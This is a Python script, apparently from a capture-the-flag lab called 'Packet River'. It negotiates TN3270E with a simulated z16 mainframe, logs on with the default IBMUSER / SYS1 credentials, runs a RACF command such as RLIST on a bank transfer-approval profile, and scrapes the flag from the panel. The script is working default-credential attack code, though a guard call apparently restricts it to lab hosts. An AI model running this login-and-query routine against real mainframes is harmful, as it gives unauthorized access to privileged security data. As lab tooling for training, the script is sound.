#!/usr/bin/env python3
"""Minimal TN3270E client for the Packet River z16 RACF extraction.

Purpose-built, like as400_5250.py and modbus_attack.py: it negotiates TN3270E,
logs on (IBMUSER / SYS1 - the install default, never revoked), runs one RACF
command at the TSO READY prompt, and prints the flag scraped off the panel.

    z16_3270.py                       # RLIST the BANK.XFER.APPROVE profile
    z16_3270.py "SETROPTS LIST"       # run a different READY command

For a full interactive green screen, use the ttyd terminal on the player box
(clicking the Bank on the map opens it) - a real 3270 client is a follow-up.
"""
import os
import re
import socket
import sys
import time

sys.path.insert(0, "/opt/pktr/scripts")
from targets import guard  # noqa: E402

HOST = os.environ.get("Z16_HOST", "z16")
PORT = int(os.environ.get("Z16_PORT", "3270"))

IAC, DO, DONT, WILL, WONT, SB, SE, EOR = 0xFF, 0xFD, 0xFE, 0xFB, 0xFC, 0xFA, 0xF0, 0xEF
O_BIN, O_EOR, O_TTYPE, O_TN3270E = 0x00, 0x19, 0x18, 0x28
TN3E_DEVICE_TYPE, TN3E_FUNCTIONS, TN3E_IS, TN3E_REQUEST = 0x02, 0x03, 0x04, 0x07
AID_ENTER = 0x7D


def send_record(sock, text):
    """One inbound AID record: TN3270E header + AID + cursor + SBA + EBCDIC."""
    body = bytes([AID_ENTER, 0x00, 0x00, 0x11, 0x40, 0x40]) + text.encode("cp037")
    payload = bytes([0x00, 0x00, 0x00, 0x00, 0x00]) + body
    out = bytearray()
    for b in payload:
        out.append(b)
        if b == IAC:
            out.append(IAC)
    out += bytes([IAC, EOR])
    sock.sendall(bytes(out))


def negotiate_and_read(sock, deadline=6.0):
    """Drive TN3270E negotiation, return every non-telnet byte received."""
    sock.settimeout(0.6)
    buf = bytearray()
    records = bytearray()
    start = time.time()
    while time.time() - start < deadline:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            if records:
                break
            continue
        if not chunk:
            break
        buf += chunk
        i = 0
        while i < len(buf):
            b = buf[i]
            if b != IAC:
                records.append(b)
                i += 1
                continue
            c = buf[i + 1] if i + 1 < len(buf) else None
            if c is None:
                break
            if c == EOR:
                i += 2
                continue
            if c == IAC:
                records.append(IAC)
                i += 2
                continue
            if c in (DO, DONT, WILL, WONT):
                if i + 2 >= len(buf):
                    break
                _reply_option(sock, c, buf[i + 2])
                i += 3
                continue
            if c == SB:
                j = buf.find(bytes([IAC, SE]), i + 2)
                if j == -1:
                    break
                _reply_subneg(sock, buf[i + 2:j])
                i = j + 2
                continue
            i += 2
        buf = buf[i:]
    return bytes(records)


def _reply_option(sock, cmd, opt):
    if cmd == DO and opt == O_TN3270E:
        sock.sendall(bytes([IAC, WILL, O_TN3270E]))
    elif cmd == DO and opt in (O_BIN, O_EOR):
        sock.sendall(bytes([IAC, WILL, opt]))
    elif cmd == WILL and opt in (O_BIN, O_EOR):
        sock.sendall(bytes([IAC, DO, opt]))
    elif cmd == DO and opt == O_TTYPE:
        sock.sendall(bytes([IAC, WONT, O_TTYPE]))


def _reply_subneg(sock, data):
    # data = [OPT_TN3270E, func, sub-op, ...]
    if len(data) < 3 or data[0] != O_TN3270E:
        return
    func, subop = data[1], data[2]
    if func == TN3E_DEVICE_TYPE and subop == TN3E_REQUEST:
        sock.sendall(bytes([IAC, SB, O_TN3270E, TN3E_DEVICE_TYPE, TN3E_IS])
                     + b"IBM-3278-2" + bytes([IAC, SE]))
    elif func == TN3E_FUNCTIONS and subop == TN3E_REQUEST:
        sock.sendall(bytes([IAC, SB, O_TN3270E, TN3E_FUNCTIONS, TN3E_IS, IAC, SE]))


def main():
    guard(HOST)
    cmd = sys.argv[1] if len(sys.argv) > 1 else "RLIST FACILITY BANK.XFER.APPROVE"
    s = socket.create_connection((HOST, PORT), timeout=6)

    negotiate_and_read(s)                        # -> RACF logon panel
    print("[*] logging on as IBMUSER / SYS1 (install default)")
    send_record(s, "IBMUSER SYS1")
    negotiate_and_read(s)                        # -> TSO READY
    print(f"[*] {cmd}")
    send_record(s, cmd)
    result = negotiate_and_read(s)               # -> command output panel
    s.close()

    text = result.decode("cp037", errors="replace")
    if os.environ.get("Z16_DEBUG"):
        print("--- decoded panel ---")
        print("".join(c if 32 <= ord(c) < 127 else "." for c in text))
        print("---------------------")
    m = re.search(r"PKTR\{[A-Za-z0-9_]+\}", text)
    if m:
        print(m.group(0))
    else:
        sys.exit("[!] no flag on the panel; try the interactive terminal")


if __name__ == "__main__":
    main()
